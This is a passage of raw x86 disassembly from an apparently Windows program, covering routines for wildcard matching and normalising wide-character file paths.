  402bab:	83 fe 05             	cmp    $0x5,%esi
  402bae:	74 05                	je     0x402bb5
  402bb0:	83 fe 06             	cmp    $0x6,%esi
  402bb3:	75 6e                	jne    0x402c23
  402bb5:	8d 44 24 14          	lea    0x14(%esp),%eax
  402bb9:	50                   	push   %eax
  402bba:	e8 12 09 00 00       	call   0x4034d1
  402bbf:	84 c0                	test   %al,%al
  402bc1:	75 cd                	jne    0x402b90
  402bc3:	83 fe 05             	cmp    $0x5,%esi
  402bc6:	74 1f                	je     0x402be7
  402bc8:	57                   	push   %edi
  402bc9:	e8 03 09 00 00       	call   0x4034d1
  402bce:	84 c0                	test   %al,%al
  402bd0:	75 15                	jne    0x402be7
  402bd2:	55                   	push   %ebp
  402bd3:	8d 84 24 18 10 00 00 	lea    0x1018(%esp),%eax
  402bda:	50                   	push   %eax
  402bdb:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  402bdf:	50                   	push   %eax
  402be0:	e8 9c 01 00 00       	call   0x402d81
  402be5:	eb 34                	jmp    0x402c1b
  402be7:	66 83 7c 24 14 00    	cmpw   $0x0,0x14(%esp)
  402bed:	74 34                	je     0x402c23
  402bef:	8d 44 24 14          	lea    0x14(%esp),%eax
  402bf3:	50                   	push   %eax
  402bf4:	e8 5a 52 01 00       	call   0x417e53
  402bf9:	59                   	pop    %ecx
  402bfa:	50                   	push   %eax
  402bfb:	8d 84 24 18 10 00 00 	lea    0x1018(%esp),%eax
  402c02:	50                   	push   %eax
  402c03:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  402c07:	50                   	push   %eax
  402c08:	84 db                	test   %bl,%bl
  402c0a:	74 0a                	je     0x402c16
  402c0c:	e8 a7 73 01 00       	call   0x419fb8
  402c11:	83 c4 0c             	add    $0xc,%esp
  402c14:	eb 05                	jmp    0x402c1b
  402c16:	e8 f9 4d 00 00       	call   0x407a14
  402c1b:	85 c0                	test   %eax,%eax
  402c1d:	0f 85 1a ff ff ff    	jne    0x402b3d
  402c23:	57                   	push   %edi
  402c24:	e8 ca 09 00 00       	call   0x4035f3
  402c29:	ff b4 24 1c 20 00 00 	push   0x201c(%esp)
  402c30:	8b f8                	mov    %eax,%edi
  402c32:	e8 bc 09 00 00       	call   0x4035f3
  402c37:	55                   	push   %ebp
  402c38:	50                   	push   %eax
  402c39:	83 fe 02             	cmp    $0x2,%esi
  402c3c:	0f 85 56 ff ff ff    	jne    0x402b98
  402c42:	57                   	push   %edi
  402c43:	e8 39 01 00 00       	call   0x402d81
  402c48:	f7 d8                	neg    %eax
  402c4a:	1b c0                	sbb    %eax,%eax
  402c4c:	40                   	inc    %eax
  402c4d:	e9 4c ff ff ff       	jmp    0x402b9e
  402c52:	53                   	push   %ebx
  402c53:	55                   	push   %ebp
  402c54:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  402c58:	56                   	push   %esi
  402c59:	8b 74 24 14          	mov    0x14(%esp),%esi
  402c5d:	57                   	push   %edi
  402c5e:	6a 2e                	push   $0x2e
  402c60:	5b                   	pop    %ebx
  402c61:	ff 74 24 1c          	push   0x1c(%esp)
  402c65:	0f b7 06             	movzwl (%esi),%eax
  402c68:	50                   	push   %eax
  402c69:	e8 34 01 00 00       	call   0x402da2
  402c6e:	ff 74 24 1c          	push   0x1c(%esp)
  402c72:	0f b7 f8             	movzwl %ax,%edi
  402c75:	0f b7 45 00          	movzwl 0x0(%ebp),%eax
  402c79:	50                   	push   %eax
  402c7a:	e8 23 01 00 00       	call   0x402da2
  402c7f:	0f b7 c8             	movzwl %ax,%ecx
  402c82:	83 c5 02             	add    $0x2,%ebp
  402c85:	8b c1                	mov    %ecx,%eax
  402c87:	85 c0                	test   %eax,%eax
  402c89:	0f 84 e5 00 00 00    	je     0x402d74
  402c8f:	6a 2a                	push   $0x2a
  402c91:	5a                   	pop    %edx
  402c92:	3b c2                	cmp    %edx,%eax
  402c94:	74 2f                	je     0x402cc5
  402c96:	83 f8 3f             	cmp    $0x3f,%eax
  402c99:	74 20                	je     0x402cbb
  402c9b:	66 3b cf             	cmp    %di,%cx
  402c9e:	74 20                	je     0x402cc0
  402ca0:	66 3b cb             	cmp    %bx,%cx
  402ca3:	75 0f                	jne    0x402cb4
  402ca5:	66 85 ff             	test   %di,%di
  402ca8:	74 b7                	je     0x402c61
  402caa:	83 ff 5c             	cmp    $0x5c,%edi
  402cad:	74 b2                	je     0x402c61
  402caf:	66 3b fb             	cmp    %bx,%di
  402cb2:	74 ad                	je     0x402c61
  402cb4:	32 c0                	xor    %al,%al
  402cb6:	e9 bf 00 00 00       	jmp    0x402d7a
  402cbb:	66 85 ff             	test   %di,%di
  402cbe:	74 f4                	je     0x402cb4
  402cc0:	83 c6 02             	add    $0x2,%esi
  402cc3:	eb 9c                	jmp    0x402c61
  402cc5:	0f b7 45 00          	movzwl 0x0(%ebp),%eax
  402cc9:	66 85 c0             	test   %ax,%ax
  402ccc:	75 07                	jne    0x402cd5
  402cce:	b0 01                	mov    $0x1,%al
  402cd0:	e9 a5 00 00 00       	jmp    0x402d7a
  402cd5:	6a 2e                	push   $0x2e
  402cd7:	59                   	pop    %ecx
  402cd8:	33 db                	xor    %ebx,%ebx
  402cda:	66 3b c1             	cmp    %cx,%ax
  402cdd:	0f 85 87 00 00 00    	jne    0x402d6a
  402ce3:	8d 45 02             	lea    0x2(%ebp),%eax
  402ce6:	89 44 24 18          	mov    %eax,0x18(%esp)
  402cea:	66 39 10             	cmp    %dx,(%eax)
  402ced:	75 06                	jne    0x402cf5
  402cef:	66 39 5d 04          	cmp    %bx,0x4(%ebp)
  402cf3:	74 d9                	je     0x402cce
  402cf5:	51                   	push   %ecx
  402cf6:	56                   	push   %esi
  402cf7:	e8 d2 14 01 00       	call   0x4141ce
  402cfc:	8b f8                	mov    %eax,%edi
  402cfe:	59                   	pop    %ecx
  402cff:	59                   	pop    %ecx
  402d00:	66 39 5d 02          	cmp    %bx,0x2(%ebp)
  402d04:	75 11                	jne    0x402d17
  402d06:	85 ff                	test   %edi,%edi
  402d08:	74 06                	je     0x402d10
  402d0a:	66 39 5f 02          	cmp    %bx,0x2(%edi)
  402d0e:	75 03                	jne    0x402d13
  402d10:	33 db                	xor    %ebx,%ebx
  402d12:	43                   	inc    %ebx
  402d13:	8a c3                	mov    %bl,%al
  402d15:	eb 63                	jmp    0x402d7a
  402d17:	85 ff                	test   %edi,%edi
  402d19:	74 4f                	je     0x402d6a
  402d1b:	68 d0 72 42 00       	push   $0x4272d0
  402d20:	55                   	push   %ebp
  402d21:	8b f7                	mov    %edi,%esi
  402d23:	e8 ca 72 01 00       	call   0x419ff2
  402d28:	59                   	pop    %ecx
  402d29:	59                   	pop    %ecx
  402d2a:	85 c0                	test   %eax,%eax
  402d2c:	75 3c                	jne    0x402d6a
  402d2e:	83 c7 02             	add    $0x2,%edi
  402d31:	6a 2e                	push   $0x2e
  402d33:	57                   	push   %edi
  402d34:	e8 95 14 01 00       	call   0x4141ce
  402d39:	59                   	pop    %ecx
  402d3a:	59                   	pop    %ecx
  402d3b:	85 c0                	test   %eax,%eax
  402d3d:	75 2b                	jne    0x402d6a
  402d3f:	ff 74 24 1c          	push   0x1c(%esp)
  402d43:	57                   	push   %edi
  402d44:	ff 74 24 20          	push   0x20(%esp)
  402d48:	e8 34 00 00 00       	call   0x402d81
  402d4d:	f7 d8                	neg    %eax
  402d4f:	1b c0                	sbb    %eax,%eax
  402d51:	40                   	inc    %eax
  402d52:	eb 26                	jmp    0x402d7a
  402d54:	ff 74 24 1c          	push   0x1c(%esp)
  402d58:	56                   	push   %esi
  402d59:	55                   	push   %ebp
  402d5a:	e8 f3 fe ff ff       	call   0x402c52
  402d5f:	83 c6 02             	add    $0x2,%esi
  402d62:	84 c0                	test   %al,%al
  402d64:	0f 85 64 ff ff ff    	jne    0x402cce
  402d6a:	66 39 1e             	cmp    %bx,(%esi)
  402d6d:	75 e5                	jne    0x402d54
  402d6f:	e9 40 ff ff ff       	jmp    0x402cb4
  402d74:	66 85 ff             	test   %di,%di
  402d77:	0f 94 c0             	sete   %al
  402d7a:	5f                   	pop    %edi
  402d7b:	5e                   	pop    %esi
  402d7c:	5d                   	pop    %ebp
  402d7d:	5b                   	pop    %ebx
  402d7e:	c2 0c 00             	ret    $0xc
  402d81:	55                   	push   %ebp
  402d82:	8b ec                	mov    %esp,%ebp
  402d84:	80 7d 10 00          	cmpb   $0x0,0x10(%ebp)
  402d88:	ff 75 0c             	push   0xc(%ebp)
  402d8b:	ff 75 08             	push   0x8(%ebp)
  402d8e:	74 09                	je     0x402d99
  402d90:	e8 a0 71 01 00       	call   0x419f35
  402d95:	59                   	pop    %ecx
  402d96:	59                   	pop    %ecx
  402d97:	eb 05                	jmp    0x402d9e
  402d99:	e8 10 38 00 00       	call   0x4065ae
  402d9e:	5d                   	pop    %ebp
  402d9f:	c2 0c 00             	ret    $0xc
  402da2:	80 7c 24 08 00       	cmpb   $0x0,0x8(%esp)
  402da7:	74 06                	je     0x402daf
  402da9:	8b 44 24 04          	mov    0x4(%esp),%eax
  402dad:	eb 09                	jmp    0x402db8
  402daf:	ff 74 24 04          	push   0x4(%esp)
  402db3:	e8 2b 4c 00 00       	call   0x4079e3
  402db8:	c2 08 00             	ret    $0x8
  402dbb:	51                   	push   %ecx
  402dbc:	56                   	push   %esi
  402dbd:	8b f1                	mov    %ecx,%esi
  402dbf:	89 74 24 04          	mov    %esi,0x4(%esp)
  402dc3:	8d 8e 24 50 00 00    	lea    0x5024(%esi),%ecx
  402dc9:	e8 86 27 00 00       	call   0x405554
  402dce:	33 c0                	xor    %eax,%eax
  402dd0:	8b ce                	mov    %esi,%ecx
  402dd2:	89 86 68 61 00 00    	mov    %eax,0x6168(%esi)
  402dd8:	89 86 6c 61 00 00    	mov    %eax,0x616c(%esi)
  402dde:	89 86 70 61 00 00    	mov    %eax,0x6170(%esi)
  402de4:	89 86 74 61 00 00    	mov    %eax,0x6174(%esi)
  402dea:	88 86 78 61 00 00    	mov    %al,0x6178(%esi)
  402df0:	89 86 a8 61 00 00    	mov    %eax,0x61a8(%esi)
  402df6:	89 86 ac 61 00 00    	mov    %eax,0x61ac(%esi)
  402dfc:	89 86 b0 61 00 00    	mov    %eax,0x61b0(%esi)
  402e02:	89 86 b4 61 00 00    	mov    %eax,0x61b4(%esi)
  402e08:	89 86 b8 61 00 00    	mov    %eax,0x61b8(%esi)
  402e0e:	89 86 bc 61 00 00    	mov    %eax,0x61bc(%esi)
  402e14:	89 86 c8 61 00 00    	mov    %eax,0x61c8(%esi)
  402e1a:	89 86 cc 61 00 00    	mov    %eax,0x61cc(%esi)
  402e20:	89 86 d0 61 00 00    	mov    %eax,0x61d0(%esi)
  402e26:	89 86 d4 61 00 00    	mov    %eax,0x61d4(%esi)
  402e2c:	89 86 d8 61 00 00    	mov    %eax,0x61d8(%esi)
  402e32:	89 86 dc 61 00 00    	mov    %eax,0x61dc(%esi)
  402e38:	e8 2f 00 00 00       	call   0x402e6c
  402e3d:	8b c6                	mov    %esi,%eax
  402e3f:	5e                   	pop    %esi
  402e40:	59                   	pop    %ecx
  402e41:	c3                   	ret
  402e42:	56                   	push   %esi
  402e43:	68 e8 82 00 00       	push   $0x82e8
  402e48:	8b f1                	mov    %ecx,%esi
  402e4a:	6a 00                	push   $0x0
  402e4c:	56                   	push   %esi
  402e4d:	e8 de 0d 01 00       	call   0x413c30
  402e52:	83 c4 0c             	add    $0xc,%esp
  402e55:	8d 8e 68 61 00 00    	lea    0x6168(%esi),%ecx
  402e5b:	e8 b5 4d 00 00       	call   0x407c15
  402e60:	8d 8e 24 50 00 00    	lea    0x5024(%esi),%ecx
  402e66:	5e                   	pop    %esi
  402e67:	e9 1c 27 00 00       	jmp    0x405588
  402e6c:	56                   	push   %esi
  402e6d:	57                   	push   %edi
  402e6e:	68 e8 82 00 00       	push   $0x82e8
  402e73:	33 ff                	xor    %edi,%edi
  402e75:	8b f1                	mov    %ecx,%esi
  402e77:	57                   	push   %edi
  402e78:	56                   	push   %esi
  402e79:	e8 b2 0d 01 00       	call   0x413c30
  402e7e:	83 c4 0c             	add    $0xc,%esp
  402e81:	89 be 30 61 00 00    	mov    %edi,0x6130(%esi)
  402e87:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  402e8c:	89 be 28 61 00 00    	mov    %edi,0x6128(%esi)
  402e92:	89 be 88 61 00 00    	mov    %edi,0x6188(%esi)
  402e98:	c7 46 0c 00 00 00 02 	movl   $0x2000000,0xc(%esi)
  402e9f:	6a 02                	push   $0x2
  402ea1:	59                   	pop    %ecx
  402ea2:	5f                   	pop    %edi
  402ea3:	c7 86 34 61 00 00 03 	movl   $0x3,0x6134(%esi)
  402eaa:	00 00 00 
  402ead:	89 8e c8 72 00 00    	mov    %ecx,0x72c8(%esi)
  402eb3:	89 86 e8 61 00 00    	mov    %eax,0x61e8(%esi)
  402eb9:	89 86 ec 61 00 00    	mov    %eax,0x61ec(%esi)
  402ebf:	89 86 f0 61 00 00    	mov    %eax,0x61f0(%esi)
  402ec5:	89 86 f4 61 00 00    	mov    %eax,0x61f4(%esi)
  402ecb:	89 8e 38 61 00 00    	mov    %ecx,0x6138(%esi)
  402ed1:	5e                   	pop    %esi
  402ed2:	c3                   	ret
  402ed3:	56                   	push   %esi
  402ed4:	8b 74 24 08          	mov    0x8(%esp),%esi
  402ed8:	56                   	push   %esi
  402ed9:	e8 75 4f 01 00       	call   0x417e53
  402ede:	59                   	pop    %ecx
  402edf:	85 c0                	test   %eax,%eax
  402ee1:	74 1e                	je     0x402f01
  402ee3:	6a 5c                	push   $0x5c
  402ee5:	5a                   	pop    %edx
  402ee6:	66 39 54 46 fe       	cmp    %dx,-0x2(%esi,%eax,2)
  402eeb:	74 14                	je     0x402f01
  402eed:	8d 48 01             	lea    0x1(%eax),%ecx
  402ef0:	3b 4c 24 0c          	cmp    0xc(%esp),%ecx
  402ef4:	73 0b                	jae    0x402f01
  402ef6:	33 c9                	xor    %ecx,%ecx
  402ef8:	66 89 14 46          	mov    %dx,(%esi,%eax,2)
  402efc:	66 89 4c 46 02       	mov    %cx,0x2(%esi,%eax,2)
  402f01:	5e                   	pop    %esi
  402f02:	c2 08 00             	ret    $0x8
  402f05:	b8 04 20 00 00       	mov    $0x2004,%eax
  402f0a:	e8 c1 fc 00 00       	call   0x412bd0
  402f0f:	55                   	push   %ebp
  402f10:	56                   	push   %esi
  402f11:	8b b4 24 10 20 00 00 	mov    0x2010(%esp),%esi
  402f18:	57                   	push   %edi
  402f19:	85 f6                	test   %esi,%esi
  402f1b:	0f 84 8e 00 00 00    	je     0x402faf
  402f21:	66 83 3e 00          	cmpw   $0x0,(%esi)
  402f25:	0f 84 84 00 00 00    	je     0x402faf
  402f2b:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402f2f:	bd 00 08 00 00       	mov    $0x800,%ebp
  402f34:	50                   	push   %eax
  402f35:	8d 44 24 14          	lea    0x14(%esp),%eax
  402f39:	50                   	push   %eax
  402f3a:	55                   	push   %ebp
  402f3b:	56                   	push   %esi
  402f3c:	ff 15 5c 70 42 00    	call   *0x42705c
  402f42:	8b f8                	mov    %eax,%edi
  402f44:	85 ff                	test   %edi,%edi
  402f46:	74 04                	je     0x402f4c
  402f48:	3b fd                	cmp    %ebp,%edi
  402f4a:	76 2e                	jbe    0x402f7a
  402f4c:	55                   	push   %ebp
  402f4d:	8d 84 24 14 10 00 00 	lea    0x1014(%esp),%eax
  402f54:	50                   	push   %eax
  402f55:	56                   	push   %esi
  402f56:	e8 6d 03 00 00       	call   0x4032c8
  402f5b:	84 c0                	test   %al,%al
  402f5d:	74 1b                	je     0x402f7a
  402f5f:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402f63:	50                   	push   %eax
  402f64:	8d 44 24 14          	lea    0x14(%esp),%eax
  402f68:	50                   	push   %eax
  402f69:	55                   	push   %ebp
  402f6a:	8d 84 24 1c 10 00 00 	lea    0x101c(%esp),%eax
  402f71:	50                   	push   %eax
  402f72:	ff 15 5c 70 42 00    	call   *0x42705c
  402f78:	8b f8                	mov    %eax,%edi
  402f7a:	85 ff                	test   %edi,%edi
  402f7c:	74 12                	je     0x402f90
  402f7e:	3b fd                	cmp    %ebp,%edi
  402f80:	73 0e                	jae    0x402f90
  402f82:	ff b4 24 1c 20 00 00 	push   0x201c(%esp)
  402f89:	8d 44 24 14          	lea    0x14(%esp),%eax
  402f8d:	50                   	push   %eax
  402f8e:	eb 11                	jmp    0x402fa1
  402f90:	3b b4 24 18 20 00 00 	cmp    0x2018(%esp),%esi
  402f97:	74 2c                	je     0x402fc5
  402f99:	ff b4 24 1c 20 00 00 	push   0x201c(%esp)
  402fa0:	56                   	push   %esi
  402fa1:	ff b4 24 20 20 00 00 	push   0x2020(%esp)
  402fa8:	e8 2e 36 00 00       	call   0x4065db
  402fad:	eb 16                	jmp    0x402fc5
  402faf:	83 bc 24 1c 20 00 00 	cmpl   $0x0,0x201c(%esp)
  402fb6:	00 
  402fb7:	76 0c                	jbe    0x402fc5
  402fb9:	8b 84 24 18 20 00 00 	mov    0x2018(%esp),%eax
  402fc0:	33 c9                	xor    %ecx,%ecx
  402fc2:	66 89 08             	mov    %cx,(%eax)
  402fc5:	5f                   	pop    %edi
  402fc6:	5e                   	pop    %esi
  402fc7:	5d                   	pop    %ebp
  402fc8:	81 c4 04 20 00 00    	add    $0x2004,%esp
  402fce:	c2 0c 00             	ret    $0xc
  402fd1:	b8 00 10 00 00       	mov    $0x1000,%eax
  402fd6:	e8 f5 fb 00 00       	call   0x412bd0
  402fdb:	53                   	push   %ebx
  402fdc:	56                   	push   %esi
  402fdd:	8b b4 24 0c 10 00 00 	mov    0x100c(%esp),%esi
  402fe4:	57                   	push   %edi
  402fe5:	6a 2e                	push   $0x2e
  402fe7:	5b                   	pop    %ebx
  402fe8:	0f b7 06             	movzwl (%esi),%eax
  402feb:	66 85 c0             	test   %ax,%ax
  402fee:	74 43                	je     0x403033
  402ff0:	8b c8                	mov    %eax,%ecx
  402ff2:	8d 7e 04             	lea    0x4(%esi),%edi
  402ff5:	0f b7 c1             	movzwl %cx,%eax
  402ff8:	50                   	push   %eax
  402ff9:	e8 bb 04 00 00       	call   0x4034b9
  402ffe:	84 c0                	test   %al,%al
  403000:	74 1c                	je     0x40301e
  403002:	66 39 5f fe          	cmp    %bx,-0x2(%edi)
  403006:	75 16                	jne    0x40301e
  403008:	66 39 1f             	cmp    %bx,(%edi)
  40300b:	75 11                	jne    0x40301e
  40300d:	0f b7 47 02          	movzwl 0x2(%edi),%eax
  403011:	50                   	push   %eax
  403012:	e8 a2 04 00 00       	call   0x4034b9
  403017:	84 c0                	test   %al,%al
  403019:	74 03                	je     0x40301e
  40301b:	8d 77 04             	lea    0x4(%edi),%esi
  40301e:	0f b7 47 fe          	movzwl -0x2(%edi),%eax
  403022:	83 c7 02             	add    $0x2,%edi
  403025:	8b c8                	mov    %eax,%ecx
  403027:	66 85 c0             	test   %ax,%ax
  40302a:	75 c9                	jne    0x402ff5
  40302c:	89 b4 24 10 10 00 00 	mov    %esi,0x1010(%esp)
  403033:	33 c9                	xor    %ecx,%ecx
  403035:	66 39 0e             	cmp    %cx,(%esi)
  403038:	0f 84 9b 00 00 00    	je     0x4030d9
  40303e:	6a 5c                	push   $0x5c
  403040:	5b                   	pop    %ebx
  403041:	55                   	push   %ebp
  403042:	8b fe                	mov    %esi,%edi
  403044:	66 39 0e             	cmp    %cx,(%esi)
  403047:	74 0a                	je     0x403053
  403049:	66 83 7e 02 3a       	cmpw   $0x3a,0x2(%esi)
  40304e:	75 03                	jne    0x403053
  403050:	8d 7e 04             	lea    0x4(%esi),%edi
  403053:	66 39 1f             	cmp    %bx,(%edi)
  403056:	75 29                	jne    0x403081
  403058:	66 39 5f 02          	cmp    %bx,0x2(%edi)
  40305c:	75 23                	jne    0x403081
  40305e:	8d 47 04             	lea    0x4(%edi),%eax
  403061:	53                   	push   %ebx
  403062:	50                   	push   %eax
  403063:	e8 66 11 01 00       	call   0x4141ce
  403068:	59                   	pop    %ecx
  403069:	59                   	pop    %ecx
  40306a:	85 c0                	test   %eax,%eax
  40306c:	74 13                	je     0x403081
  40306e:	83 c0 02             	add    $0x2,%eax
  403071:	53                   	push   %ebx
  403072:	50                   	push   %eax
  403073:	e8 56 11 01 00       	call   0x4141ce
  403078:	59                   	pop    %ecx
  403079:	59                   	pop    %ecx
  40307a:	85 c0                	test   %eax,%eax
  40307c:	74 03                	je     0x403081
  40307e:	8d 78 02             	lea    0x2(%eax),%edi
  403081:	0f b7 07             	movzwl (%edi),%eax
  403084:	8b ef                	mov    %edi,%ebp
  403086:	66 85 c0             	test   %ax,%ax
  403089:	74 32                	je     0x4030bd
  40308b:	6a 2e                	push   $0x2e
  40308d:	8b d8                	mov    %eax,%ebx
  40308f:	5e                   	pop    %esi
  403090:	0f b7 c3             	movzwl %bx,%eax
  403093:	50                   	push   %eax
  403094:	e8 20 04 00 00       	call   0x4034b9
  403099:	84 c0                	test   %al,%al
  40309b:	74 05                	je     0x4030a2
  40309d:	8d 7d 02             	lea    0x2(%ebp),%edi
  4030a0:	eb 05                	jmp    0x4030a7
  4030a2:	66 3b de             	cmp    %si,%bx
  4030a5:	75 0c                	jne    0x4030b3
  4030a7:	83 c5 02             	add    $0x2,%ebp
  4030aa:	0f b7 5d 00          	movzwl 0x0(%ebp),%ebx
  4030ae:	66 85 db             	test   %bx,%bx
  4030b1:	75 dd                	jne    0x403090
  4030b3:	8b b4 24 14 10 00 00 	mov    0x1014(%esp),%esi
  4030ba:	6a 5c                	push   $0x5c
  4030bc:	5b                   	pop    %ebx
  4030bd:	33 c9                	xor    %ecx,%ecx
  4030bf:	3b fe                	cmp    %esi,%edi
  4030c1:	74 12                	je     0x4030d5
  4030c3:	8b f7                	mov    %edi,%esi
  4030c5:	89 b4 24 14 10 00 00 	mov    %esi,0x1014(%esp)
  4030cc:	66 39 0f             	cmp    %cx,(%edi)
  4030cf:	0f 85 6d ff ff ff    	jne    0x403042
  4030d5:	6a 2e                	push   $0x2e
  4030d7:	5b                   	pop    %ebx
  4030d8:	5d                   	pop    %ebp
  4030d9:	66 39 1e             	cmp    %bx,(%esi)
  4030dc:	75 0f                	jne    0x4030ed
  4030de:	66 39 5e 02          	cmp    %bx,0x2(%esi)
  4030e2:	75 09                	jne    0x4030ed
  4030e4:	66 39 4e 04          	cmp    %cx,0x4(%esi)
  4030e8:	75 03                	jne    0x4030ed
  4030ea:	83 c6 04             	add    $0x4,%esi
  4030ed:	83 bc 24 14 10 00 00 	cmpl   $0x0,0x1014(%esp)
  4030f4:	00 
  4030f5:	74 28                	je     0x40311f
  4030f7:	68 00 08 00 00       	push   $0x800
  4030fc:	56                   	push   %esi
  4030fd:	8d 44 24 14          	lea    0x14(%esp),%eax
  403101:	50                   	push   %eax
  403102:	e8 d4 34 00 00       	call   0x4065db
  403107:	ff b4 24 18 10 00 00 	push   0x1018(%esp)
  40310e:	8d 44 24 10          	lea    0x10(%esp),%eax
  403112:	50                   	push   %eax
  403113:	ff b4 24 1c 10 00 00 	push   0x101c(%esp)
  40311a:	e8 bc 34 00 00       	call   0x4065db
  40311f:	5f                   	pop    %edi
  403120:	8b c6                	mov    %esi,%eax
  403122:	5e                   	pop    %esi
  403123:	5b                   	pop    %ebx
  403124:	81 c4 00 10 00 00    	add    $0x1000,%esp
  40312a:	c2 0c 00             	ret    $0xc
  40312d:	55                   	push   %ebp
  40312e:	8b ec                	mov    %esp,%ebp
  403130:	b8 00 10 00 00       	mov    $0x1000,%eax
  403135:	e8 96 fa 00 00       	call   0x412bd0
  40313a:	e8 f6 f8 ff ff       	call   0x402a35
  40313f:	3d 00 06 00 00       	cmp    $0x600,%eax
  403144:	72 35                	jb     0x40317b
  403146:	68 00 08 00 00       	push   $0x800
  40314b:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  403151:	50                   	push   %eax
  403152:	6a ff                	push   $0xffffffff
  403154:	ff 75 08             	push   0x8(%ebp)
  403157:	6a 20                	push   $0x20
  403159:	ff 15 60 70 42 00    	call   *0x427060
  40315f:	85 c0                	test   %eax,%eax
  403161:	74 18                	je     0x40317b
  403163:	ff 75 0c             	push   0xc(%ebp)
  403166:	33 c0                	xor    %eax,%eax
  403168:	66 89 45 fe          	mov    %ax,-0x2(%ebp)
  40316c:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  403172:	50                   	push   %eax
  403173:	ff 75 08             	push   0x8(%ebp)
  403176:	e8 60 34 00 00       	call   0x4065db
  40317b:	8b e5                	mov    %ebp,%esp
  40317d:	5d                   	pop    %ebp
  40317e:	c2 08 00             	ret    $0x8
  403181:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  403186:	75 04                	jne    0x40318c
  403188:	33 c0                	xor    %eax,%eax
  40318a:	eb 13                	jmp    0x40319f
  40318c:	ff 74 24 04          	push   0x4(%esp)
  403190:	e8 5e 04 00 00       	call   0x4035f3
  403195:	6a 2e                	push   $0x2e
  403197:	50                   	push   %eax
  403198:	e8 0e 12 01 00       	call   0x4143ab
  40319d:	59                   	pop    %ecx
  40319e:	59                   	pop    %ecx
  40319f:	c2 04 00             	ret    $0x4
  4031a2:	57                   	push   %edi
  4031a3:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4031a7:	85 ff                	test   %edi,%edi
  4031a9:	74 36                	je     0x4031e1
  4031ab:	56                   	push   %esi
  4031ac:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4031b0:	4f                   	dec    %edi
  4031b1:	56                   	push   %esi
  4031b2:	e8 3c 04 00 00       	call   0x4035f3
  4031b7:	2b c6                	sub    %esi,%eax
  4031b9:	d1 f8                	sar    $1,%eax
  4031bb:	3b f8                	cmp    %eax,%edi
  4031bd:	72 0c                	jb     0x4031cb
  4031bf:	56                   	push   %esi
  4031c0:	e8 2e 04 00 00       	call   0x4035f3
  4031c5:	8b f8                	mov    %eax,%edi
  4031c7:	2b fe                	sub    %esi,%edi
  4031c9:	d1 ff                	sar    $1,%edi
  4031cb:	57                   	push   %edi
  4031cc:	56                   	push   %esi
  4031cd:	8b 74 24 18          	mov    0x18(%esp),%esi
  4031d1:	56                   	push   %esi
  4031d2:	e8 9e 6d 01 00       	call   0x419f75
  4031d7:	83 c4 0c             	add    $0xc,%esp
  4031da:	33 c0                	xor    %eax,%eax
  4031dc:	66 89 04 7e          	mov    %ax,(%esi,%edi,2)
  4031e0:	5e                   	pop    %esi
  4031e1:	5f                   	pop    %edi
  4031e2:	c2 0c 00             	ret    $0xc
  4031e5:	53                   	push   %ebx
  4031e6:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  4031ea:	33 c0                	xor    %eax,%eax
  4031ec:	57                   	push   %edi
  4031ed:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4031f1:	57                   	push   %edi
  4031f2:	66 89 03             	mov    %ax,(%ebx)
  4031f5:	e8 5d 02 00 00       	call   0x403457
  4031fa:	84 c0                	test   %al,%al
  4031fc:	74 18                	je     0x403216
  4031fe:	0f b7 07             	movzwl (%edi),%eax
  403201:	50                   	push   %eax
  403202:	68 fc 72 42 00       	push   $0x4272fc
  403207:	ff 74 24 1c          	push   0x1c(%esp)
  40320b:	53                   	push   %ebx
  40320c:	e8 04 05 00 00       	call   0x403715
  403211:	83 c4 10             	add    $0x10,%esp
  403214:	eb 57                	jmp    0x40326d
  403216:	56                   	push   %esi
  403217:	6a 5c                	push   $0x5c
  403219:	5e                   	pop    %esi
  40321a:	66 39 37             	cmp    %si,(%edi)
  40321d:	75 4d                	jne    0x40326c
  40321f:	66 39 77 02          	cmp    %si,0x2(%edi)
  403223:	75 47                	jne    0x40326c
  403225:	8d 47 04             	lea    0x4(%edi),%eax
  403228:	56                   	push   %esi
  403229:	50                   	push   %eax
  40322a:	e8 9f 0f 01 00       	call   0x4141ce
  40322f:	59                   	pop    %ecx
  403230:	59                   	pop    %ecx
  403231:	85 c0                	test   %eax,%eax
  403233:	74 37                	je     0x40326c
  403235:	83 c0 02             	add    $0x2,%eax
  403238:	56                   	push   %esi
  403239:	50                   	push   %eax
  40323a:	e8 8f 0f 01 00       	call   0x4141ce
  40323f:	59                   	pop    %ecx
  403240:	59                   	pop    %ecx
  403241:	85 c0                	test   %eax,%eax
  403243:	74 07                	je     0x40324c
  403245:	2b c7                	sub    %edi,%eax
  403247:	d1 f8                	sar    $1,%eax
  403249:	40                   	inc    %eax
  40324a:	eb 07                	jmp    0x403253
  40324c:	57                   	push   %edi
  40324d:	e8 01 4c 01 00       	call   0x417e53
  403252:	59                   	pop    %ecx
  403253:	3b 44 24 18          	cmp    0x18(%esp),%eax
  403257:	1b f6                	sbb    %esi,%esi
  403259:	23 f0                	and    %eax,%esi
  40325b:	56                   	push   %esi
  40325c:	57                   	push   %edi
  40325d:	53                   	push   %ebx
  40325e:	e8 12 6d 01 00       	call   0x419f75
  403263:	83 c4 0c             	add    $0xc,%esp
  403266:	33 c0                	xor    %eax,%eax
  403268:	66 89 04 73          	mov    %ax,(%ebx,%esi,2)
  40326c:	5e                   	pop    %esi
  40326d:	5f                   	pop    %edi
  40326e:	5b                   	pop    %ebx
  40326f:	c2 0c 00             	ret    $0xc
  403272:	55                   	push   %ebp
  403273:	8b ec                	mov    %esp,%ebp
  403275:	8b 45 0c             	mov    0xc(%ebp),%eax
  403278:	56                   	push   %esi
  403279:	57                   	push   %edi
  40327a:	8b 7d 14             	mov    0x14(%ebp),%edi
  40327d:	85 c0                	test   %eax,%eax
  40327f:	74 1a                	je     0x40329b
  403281:	66 83 38 00          	cmpw   $0x0,(%eax)
  403285:	74 14                	je     0x40329b
